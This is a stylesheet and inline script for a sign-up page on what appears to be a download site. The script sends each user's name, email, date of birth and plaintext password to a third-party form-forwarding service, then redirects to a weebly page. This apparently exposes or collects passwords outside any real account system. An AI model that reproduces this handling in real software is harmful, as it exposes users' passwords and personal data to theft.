:root {
  --bg: #0b0c10;
  --card: #13141a;
  --border: #222430;
  --accent: #c8f135;
  --accent2: #7fff6e;
  --text: #f0f0f0;
  --muted: #6b6f7e;
  --input-bg: #1a1b24;
  --error: #ff5f5f;
}

body {
  min-height: 100vh;
  background: var(--bg);
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: 'DM Sans', sans-serif;
  color: var(--text);
  overflow: hidden;
}

/* Background blobs */
body::before, body::after {
  content: '';
  position: fixed;
  border-radius: 50%;
  filter: blur(120px);
  z-index: 0;
  pointer-events: none;
}
body::before {
  width: 500px; height: 500px;
  background: radial-gradient(circle, #c8f13520 0%, transparent 70%);
  top: -150px; right: -100px;
}
body::after {
  width: 400px; height: 400px;
  background: radial-gradient(circle, #7fff6e18 0%, transparent 70%);
  bottom: -120px; left: -80px;
}

.card {
  position: relative;
  z-index: 1;
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 24px;
  padding: 48px 44px;
  width: 100%;
  max-width: 440px;
  box-shadow: 0 0 60px #c8f13510, 0 30px 80px #00000060;
  animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) both;
}

@keyframes slideUp {
  from { opacity: 0; transform: translateY(30px); }
  to   { opacity: 1; transform: translateY(0); }
}

.logo-dot {
  width: 10px; height: 10px;
  background: var(--accent);
  border-radius: 50%;
  display: inline-block;
  margin-right: 8px;
  box-shadow: 0 0 10px var(--accent);
}

.brand {
  font-family: 'Syne', sans-serif;
  font-size: 13px;
  font-weight: 600;
  letter-spacing: 0.15em;
  text-transform: uppercase;
  color: var(--muted);
  margin-bottom: 32px;
  display: flex;
  align-items: center;
}

h1 {
  font-family: 'Syne', sans-serif;
  font-size: 32px;
  font-weight: 800;
  line-height: 1.1;
  margin-bottom: 6px;
  letter-spacing: -0.5px;
}

h1 span {
  color: var(--accent);
}

.subtitle {
  font-size: 14px;
  color: var(--muted);
  margin-bottom: 36px;
  font-weight: 300;
}

.field {
  margin-bottom: 18px;
}

label {
  display: block;
  font-size: 12px;
  font-weight: 500;
  letter-spacing: 0.08em;
  text-transform: uppercase;
  color: var(--muted);
  margin-bottom: 8px;
}

input {
  width: 100%;
  background: var(--input-bg);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 14px 16px;
  font-size: 15px;
  font-family: 'DM Sans', sans-serif;
  color: var(--text);
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s;
  -webkit-appearance: none;
}

input:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px #c8f13518;
}

input::placeholder { color: #3d3f4e; }

input[type="date"]::-webkit-calendar-picker-indicator {
  filter: invert(0.4);
  cursor: pointer;
}

.pass-wrap {
  position: relative;
}
.pass-wrap input { padding-right: 44px; }
.eye-btn {
  position: absolute;
  right: 14px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  cursor: pointer;
  color: var(--muted);
  font-size: 18px;
  line-height: 1;
  padding: 0;
  transition: color 0.2s;
}
.eye-btn:hover { color: var(--accent); }

.btn {
  width: 100%;
  margin-top: 28px;
  padding: 16px;
  background: var(--accent);
  color: #0b0c10;
  border: none;
  border-radius: 12px;
  font-size: 15px;
  font-family: 'Syne', sans-serif;
  font-weight: 700;
  letter-spacing: 0.05em;
  cursor: pointer;
  transition: transform 0.15s, box-shadow 0.15s, background 0.15s;
  position: relative;
  overflow: hidden;
}

.btn:hover {
  background: var(--accent2);
  box-shadow: 0 8px 30px #c8f13540;
  transform: translateY(-1px);
}

.btn:active { transform: translateY(0); }

.btn.loading {
  pointer-events: none;
  opacity: 0.7;
}

.btn .spinner {
  display: none;
  width: 18px; height: 18px;
  border: 2px solid #0b0c1060;
  border-top-color: #0b0c10;
  border-radius: 50%;
  animation: spin 0.7s linear infinite;
  margin: 0 auto;
}

.btn.loading .btn-text { display: none; }
.btn.loading .spinner { display: block; }

@keyframes spin { to { transform: rotate(360deg); } }

.success-msg {
  display: none;
  text-align: center;
  padding: 20px;
  background: #c8f13512;
  border: 1px solid #c8f13530;
  border-radius: 12px;
  margin-top: 20px;
  font-size: 14px;
  color: var(--accent);
  animation: fadeIn 0.4s ease;
}

@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

.err-msg {
  font-size: 11px;
  color: var(--error);
  margin-top: 5px;
  display: none;
}

.divider {
  height: 1px;
  background: var(--border);
  margin: 28px 0 0;
}

@media (max-width: 480px) {
  .card { padding: 36px 24px; margin: 16px; border-radius: 20px; }
  h1 { font-size: 26px; }
}

<script>
  function togglePass() {
    const p = document.getElementById('password');
    const btn = document.getElementById('eyeBtn');
    if (p.type === 'password') {
      p.type = 'text';
      btn.textContent = '🙈';
    } else {
      p.type = 'password';
      btn.textContent = '👁';
    }
  }

  document.getElementById('signupForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    // Clear errors
    document.querySelectorAll('.err-msg').forEach(el => el.style.display = 'none');

    const name = document.getElementById('name').value.trim();
    const email = document.getElementById('email').value.trim();
    const dob = document.getElementById('dob').value;
    const password = document.getElementById('password').value;

    let valid = true;

    if (!name) {
      document.getElementById('nameErr').style.display = 'block';
      valid = false;
    }
    if (!email || !/\S+@\S+\.\S+/.test(email)) {
      document.getElementById('emailErr').style.display = 'block';
      valid = false;
    }
    if (!dob) {
      document.getElementById('dobErr').style.display = 'block';
      valid = false;
    }
    if (password.length < 6) {
      document.getElementById('passErr').style.display = 'block';
      valid = false;
    }

    if (!valid) return;

    const btn = document.getElementById('submitBtn');
    btn.classList.add('loading');

    const formData = new FormData();
    formData.append('name', name);
    formData.append('email', email);
    formData.append('date_of_birth', dob);
    formData.append('password', password);
    formData.append('_next', 'https://allinonedown.weebly.com');
    formData.append('_subject', 'New Sign Up Submission');

    try {
      const res = await fetch('https://formspree.io/f/mpqbdbor', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      });

      if (res.ok) {
        document.getElementById('successMsg').style.display = 'block';
        document.getElementById('signupForm').style.display = 'none';
        setTimeout(() => {
          window.location.href = 'https://allinonedown.weebly.com';
        }, 1500);
      } else {
        alert('Something went wrong. Please try again.');
        btn.classList.remove('loading');
      }
    } catch (err) {
      alert('Network error. Please check your connection.');
      btn.classList.remove('loading');
    }
  });
</script>
